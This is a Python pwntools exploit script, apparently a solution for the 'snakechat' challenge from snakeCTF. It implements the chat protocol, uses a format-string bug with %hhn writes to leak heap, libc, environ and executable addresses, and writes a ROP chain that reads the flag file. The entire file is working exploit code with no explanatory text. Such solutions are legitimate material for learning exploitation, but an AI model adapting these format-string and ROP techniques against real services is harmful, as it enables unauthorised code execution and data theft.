#!/usr/bin/env python3
import string

from enum import Enum
from typing import Self
from pwn import *

HOST = args.HOST or 'localhost'
PORT = args.PORT or 1337
SSL = args.SSL

ADMIN_ID = 2627315809483599117

context.binary = exe = ELF("./snakechat")
libc = ELF("./libc.so.6")

class PktType(Enum):
    LOGIN = 'LOGIN'
    NEW_MSG = 'NEW_MSG'

    @staticmethod
    def from_str(s: str) -> Self:
        for mt in PktType:
            if mt.value == s:
                return mt
        raise ValueError("Invalid PktType")

def parse_proto_int(s: bytes) -> tuple[int, int]:
    if not s or s[0:1] != b"\t":
        raise ValueError("Invalid proto int")
    if b"\t" in s[1:]:
        idx = s[1:].index(b"\t") + 1
    elif b"\r" in s[1:]:
        idx = s[1:].index(b"\r") + 1
    else:
        raise ValueError("Invalid proto int")

    if any([c for c in s[1:idx] if c not in string.digits.encode()]):
        raise ValueError("Invalid proto int")
    
    return idx, int(s[1:idx].decode(), 10)


def parse_proto_str(s: bytes) -> tuple[int, bytes]:
    idx, str_l = parse_proto_int(s)

    if s[idx:idx + 1] != b"\t":
        raise ValueError("Invalid proto str")

    if len(s) < idx + str_l + 1 or len(str_p := s[idx + 1:idx + str_l + 1]) != str_l:
        raise ValueError("Invalid proto str length")
    
    if [c for c in str_p if c in b"\r\n"]:
        raise ValueError("Invalid proto str content")
    
    if s[idx + str_l + 1:idx + str_l + 2] not in [b"\r", b"\t"]:
        raise ValueError("Invalid proto str")
    
    return idx + str_l + 1, str_p


def proto_parse_type(s: bytes) -> tuple[int, PktType]:
    idx = s.index(b"\t")

    return idx, PktType.from_str(s[:idx].decode())

class LoginPkt():
    
    def __init__(self: Self, b: bytes):
        idx = len("LOGIN_OK")
        idx_tmp, self._id = parse_proto_int(b[idx:])
        idx += idx_tmp
        _, self._name = parse_proto_str(b[idx:])

    def id(self: Self):
        return self._id

    def name(self: Self):
        return self._name

class NewMsgPkt():

    def __init__(self: Self, b: bytes):
        idx = len("NEW_MSG")
        idx_tmp, self._src = parse_proto_int(b[idx:])
        idx += idx_tmp

        idx_tmp, self._msg = parse_proto_str(b[idx:])
        idx += idx_tmp

        self._args = []
        idx_tmp, args_len = parse_proto_int(b[idx:])
        idx += idx_tmp

        for _ in range(args_len):
            idx_tmp, arg = parse_proto_int(b[idx:])
            idx += idx_tmp
            self._args.append(arg)

    def src(self: Self) -> bytes:
        return self._src

    def msg(self: Self) -> bytes:
        return self._msg
    
    def args(self: Self) -> list[int]:
        return self._args

def proto_str(s: bytes) -> bytes:
    s = s.replace(b"\r", b"").replace(b"\n", b"")
    return str(len(s)).encode() + b"\t" + s

def proto_user(id: int, name: bytes) -> bytes:
    return str(id).encode() + b"\t" + proto_str(name)

def proto_list(content: list[bytes]) -> bytes:
    return b"\t".join([str(len(content)).encode(), *content])

def proto_new_msg(msg: bytes, args: list[int]) -> bytes:
    return b"NEW_MSG\t" + proto_str(msg) + b"\t" + proto_list([str(a).encode() for a in args]) + b"\r\n"

def proto_login(name: bytes) -> bytes:
    return b"LOGIN\t" + proto_str(name) + b"\r\n"

class Client:
    def __init__(self, name):
        self.r = remote(HOST, PORT, ssl=SSL)
        self.r.send(proto_login(name.encode()))
    
    def msg(self, text: bytes, args: list[int] = []):
        self.r.send(proto_new_msg(text, args))

    def recv(self):
        l = self.r.recvuntil(b"\r\n")

        if l.startswith(b"NEW_MSG"):
            return NewMsgPkt(l)
        elif l.startswith(b"LOGIN"):
            return LoginPkt(l)
        
        return None
            

    def close(self):
        self.r.close()


def gen_fmtstr(addr, val, prev = 0) -> tuple[bytes, list[int], int]:
    fmtstr = b""
    args = []
    for i, c in enumerate(val):
        if (c - prev) == 0:
            fmtstr += b"%hhn"
            args.append(addr + i)
        else:
            fmtstr += f"%{(c - prev) % 256}c%hhn".encode()
            args.append(0x41)
            args.append(addr + i)
        prev = c
    return fmtstr, args, prev

def find_leak(A: Client, n=1) -> int:
    msgs = [A.recv() for _ in range(n)]
    msgs = filter(lambda x: isinstance(x, NewMsgPkt), msgs)
    msgs = filter(lambda x: b"Hello" in x.msg() and len(x.args()) > 0, msgs)
    msgs = list(msgs)
    msgs = sorted(msgs, key=lambda x: x.args()[0])
    return msgs[0].args()[0]

def exploit():

    A = Client("A" * 1)
    A.msg(b"A"*0x67, [ADMIN_ID] * (0x68 // 8))
    for i in range(10):
        A.msg(b"A" * (0x100 + i * 0x10))
        sleep(0.1)
    ZZ = Client('p0') # overlap name with ptr value
    B = Client('B') # get ptr to ZZ list struct 
    A.msg(b"%112c%590$hhn".ljust(0x67, b"B"), [ADMIN_ID] * (0x68 // 8)) # set to 0x3070 from 0x3050

    thread2_leak = find_leak(A, 10 + 3 + 3 + 2) #
    log.success(f"thread2 leak: {hex(thread2_leak)}")
    thread2_heap = thread2_leak & ~0xFFFF
    log.success(f"thread2 heap: {hex(thread2_heap)}")

    fmtstr1, args1, prev1 = gen_fmtstr(thread2_heap + 0x8a0 - 8, p64(thread2_heap + 0x3290))
    fmtstr2, args2, _ = gen_fmtstr(thread2_heap + 0x32d0, p16(0x8a0 - 8), prev1)
    fmtstr, args = fmtstr1 + fmtstr2, args1 + args2

    C = Client('C')
    A.msg(fmtstr, args)

    libc_leak = find_leak(A, 3)
    log.success(f"libc leak: {hex(libc_leak)}")
    libc.address = libc_leak - libc.sym['main_arena']
    log.success(f"libc base: {hex(libc.address)}")

    fmtstr, args, _ = gen_fmtstr(thread2_heap + 0x32d0, p16(0x32b0), prev1) # fix to avoid faults
    A.msg(fmtstr, args)

    fmtstr1, args1, prev1 = gen_fmtstr(libc.sym['_IO_list_all'] - 8, p64(thread2_heap + 0x3030))
    fmtstr2, args2, _ = gen_fmtstr(thread2_heap + 0x35a0, p64(libc.sym['_IO_list_all'] - 8), prev1)
    fmtstr, args = fmtstr1 + fmtstr2, args1 + args2

    D = Client("D")
    A.msg(fmtstr, args)

    main_heap_leak = find_leak(A, 4)
    log.success(f"main heap leak: {hex(main_heap_leak)}")
    main_heap = main_heap_leak - 0x2390
    log.success(f"main heap: {hex(main_heap)}")

    fmtstr1, args1, prev1 = gen_fmtstr(libc.sym['environ'] - 8, p64(thread2_heap + 0x3530))
    fmtstr2, args2, _ = gen_fmtstr(thread2_heap + 0x3960, p64(libc.sym['environ'] - 8), prev1)
    fmtstr, args = fmtstr1 + fmtstr2, args1 + args2

    E = Client("E")
    A.msg(fmtstr, args)

    environ = find_leak(A, 3)
    log.success(f"environ: {hex(environ)}")
    ROP_TARGET = environ - 0x290
    log.success(f"ROP_TARGET: {hex(ROP_TARGET)}")

    fmtstr1, args1, prev1 = gen_fmtstr(environ - 0x70, p64(thread2_heap + 0x3920))
    fmtstr2, args2, _ = gen_fmtstr(thread2_heap + 0x3ca0, p64(environ - 0x70), prev1)
    fmtstr, args = fmtstr1 + fmtstr2, args1 + args2

    F = Client("F")
    A.msg(fmtstr, args)
    exe_leak = find_leak(A, 3)
    log.success(f"exe leak: {hex(exe_leak)}")
    exe.address = exe_leak - exe.sym['_start']
    log.success(f"exe base: {hex(exe.address)}")


    rop = ROP([exe, libc], base=ROP_TARGET)
    rop.open(b"flag", 0)
    rop(rbp = environ)
    rop.raw(rop.ret.address)
    rop.raw(exe.address + 0x2741)

    fmtstr1, args1, prev = gen_fmtstr(ROP_TARGET, rop.chain())
    fmtstr2, args2, _ = gen_fmtstr(libc.sym['_IO_2_1_stdin_']+112, p8(4), prev)
    fmtstr, args = fmtstr1 + fmtstr2, args1 + args2
    A.msg(fmtstr, args)

    B.close()

    while True:
        msg = A.recv()
        if isinstance(msg, NewMsgPkt) and b"snakeCTF{" in msg.msg():
            log.success(f"flag: {msg.msg().decode().strip()}")
            break

if __name__ == '__main__':
    if args.UNSTRIP:
        libcdb.unstrip_libc("./libc.so.6")
    else:
        exploit()
